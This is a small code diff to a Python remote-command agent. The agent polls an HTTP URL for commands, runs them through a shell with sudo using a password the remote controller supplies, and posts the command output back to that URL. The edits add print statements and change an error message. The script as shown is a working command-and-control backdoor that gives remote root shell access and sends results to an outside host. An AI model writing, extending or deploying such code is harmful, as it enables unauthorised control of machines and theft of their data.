@@ -9,6 +9,7 @@ pwd = ''
 while True:
 	req = requests.get(http_url)
 	cmd = req.text
+	print(cmd)
 
 	if 'terminate' in cmd:
 		break
@@ -20,10 +21,11 @@ while True:
 			sc = "echo {} | sudo -S {}".format(pwd,c)
 			cmdpmpt = subprocess.Popen(sc, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 			post_resp = requests.post(url=http_url, data=cmdpmpt.stdout.read())
-
-			post_resp = requests.post(url=http_url, data=cmdpmpt.stderr.read()) 
+			print(post_resp)
+			post_resp = requests.post(url=http_url, data=cmdpmpt.stderr.read())
+			print(post_resp) 
 		else:
-			post_resp = requests.post(url=http_url, data=cmdpmpt.stdout.read())
+			post_resp = requests.post(url=http_url, data='[-]sudo pwd not set')
 	
 	elif 'setpwd' in cmd:
 		x,c = cmd.split('-')
